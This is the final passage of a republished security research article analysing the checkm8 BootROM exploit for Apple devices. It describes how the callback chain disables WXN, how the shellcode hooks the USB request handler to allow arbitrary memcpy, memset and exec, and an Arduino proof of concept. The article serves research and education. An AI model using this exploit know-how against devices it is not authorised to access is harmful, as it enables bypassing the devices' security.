the <code>WXN</code> disabling code is possible due to the modified translation table. </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> The original value of the <code>TTBR0_EL1</code> translation register is restored. It is necessary for the correct operation of <code>BootROM</code> during the translation of virtual addresses because the data in <code>INSECURE_MEMORY</code> will be overwritten. </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p> The translation table is reset again. </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p> Interrupt handling is back to normal. </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p> Control is transferred to the initializing <code>shellcode</code> . </p><br><p> Thus, the main task of <code>callback-chain</code> is to disable <code>WXN</code> and transfer control to the <code>shellcode</code> in <code>RW</code> memory. </p><br><h2 id="6-execution-of-shellcode"> 6. Execution of <code>shellcode</code> </h2><br><p> The <code>shellcode</code> is in <code>src/checkm8_arm64.S</code> and does the following: </p><br><h4 id="61-overwriting-usb-configuration-descriptors"> 6.1. Overwriting <code>USB</code> configuration descriptors </h4><br><p> In the global memory, two pointers to configuration descriptors <code>usb_core_hs_configuration_descriptor</code> and <code>usb_core_fs_configuration_descriptor</code> located in the heap are stored. In the third stage, these descriptors were damaged. They are necessary for the correct interaction with a <code>USB</code> device, so the <code>shellcode</code> restores them. </p><br><h4 id="62-changing-usbserialnumber"> 6.2. Changing <code>USBSerialNumber</code> </h4><br><p> A new string descriptor with a serial number is created with a substring <code>" PWND:[checkm8]"</code> added to it. This will help us understand if the exploit was successful. </p><br><h4 id="63-overwriting-the-pointer-of-the-usb-request-handler"> 6.3. Overwriting the pointer of the <code>USB</code> request handler </h4><br><p> The original pointer to the handler of <code>USB</code> requests to the interface is overwritten by a pointer to a new handler, which will be placed in the memory at the next step. </p><br><h4 id="64-copying-usb-request-handler-into-trampoline-memory-area-0x1800afc00"> 6.4. Copying <code>USB</code> request handler into <code>TRAMPOLINE</code> memory area ( <code>0x1800AFC00</code> ) </h4><br><p> Upon receiving a <code>USB</code> request, the new handler checks the <code>wValue</code> of the request against <code>0xffff</code> and if they're not equal, it transfers control back to the original handler. If they are equal, various commands can be executed in the new handlers, like <code>memcpy</code> , <code>memset</code> , and <code>exec</code> (calling an arbitrary address with an arbitrary set of arguments). </p><br><p> Thus, the analysis of the exploit is complete. </p><br><h2 id="the-implementation-of-the-exploit-at-a-lower-level-of-working-with-usb"> The implementation of the exploit at a lower level of working with USB </h2><br><p> As a bonus and an example of the attack at lower levels, we published a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Proof-of-Concept</a> of the <code>checkm8</code> implementation on <code>Arduino</code> with <code>USB Host Shield</code> . The PoC works only for <code>iPhone 7</code> but can be easily ported to other devices. When an <code>iPhone 7</code> in <code>DFU</code> mode is connected to <code>USB Host Shield</code> , all the steps described in this article will be executed, and the device will enter <code>PWND:[checkm8]</code> mode. Then, it can be connected to a PC via <code>USB</code> to work with it using <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ipwndfu</a> (to dump memory, use crypto keys, etc.). This method is more stable than using asynchronous requests with a minimal timeout because we work directly with the <code>USB</code> controller. We used the <a href="">USB_Host_Shield_2.0</a> library. It needs minor modifications; the patch file is also in the repository. </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="in-place-of-a-conclusion"> In place of a conclusion </h2><br><p> Analyzing <code>checkm8</code> was very interesting. We hope that this article will be useful for the community and will motivate new research in this area. The vulnerability will continue to influence the jailbreak community. A jailbreak based on <code>checkm8</code> is already being developed — <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">checkra1n</a> , and since the vulnerability is unfixable, it will always work on vulnerable chips ( <code>A5</code> to <code>A11</code> ) regardless of the iOS version. Plus, there are many vulnerable devices, like <code>iWatch</code> , <code>Apple TV</code> , etc. We expect more interesting projects for Apple devices to come. </p><br><p> Besides jailbreak, this vulnerability will also influence the researchers of Apple devices. With <code>checkm8</code> , you can already boot <code>iOS</code> devices in verbose mode, dump <code>SecureROM</code> , or use the <code>GID</code> key to decrypt firmware images. Although, the most interesting application for this exploit would be entering debug mode on vulnerable devices with <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">a special JTAG/SWD cable</a> . Before that, it could only be done with special prototypes that are <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">extremely hard to get</a> or with the help of <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">special services</a> . Thus, with <code>checkm8</code> , <code>Apple</code> research becomes way easier and cheaper. </p><br><h2 id="references"> References </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">an ipwndfu fork from LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id472762/">https://habr.com/ru/post/id472762/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id472750/index.html">OK, apakah saya benar-benar membutuhkan Kubernet?</a></li>
<li><a href="../id472752/index.html">CSE: Kubernetes untuk siapa pun di vCloud</a></li>
<li><a href="../id472754/index.html">Cara berbicara bahasa Inggris dalam sebulan. 9 langkah mudah dan terbukti</a></li>
<li><a href="../id472758/index.html">Proposal: coba - fungsi pengecekan kesalahan bawaan</a></li>
<li><a href="../id472760/index.html">Kurangi waktu komputasi dari beberapa tahun menjadi beberapa menit. Memahami pembelajaran mesin kuantum</a></li>
<li><a href="../id472766/index.html">Parameterisasi dari file di py.test</a></li>
<li><a href="../id472768/index.html">Cara merekrut, memecat, dan kembali dari manajemen ke pengembangan: video dari Badoo Techleads Meetup # 5</a></li>
<li><a href="../id472770/index.html">Organisasi antarmuka dalam Persatuan dengan Kanvas UI</a></li>
<li><a href="../id472772/index.html">Cari insiden dan klaim serupa. Metrik dan Optimasi</a></li>
<li><a href="../id472776/index.html">Cadangan Bagian 7: Kesimpulan</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>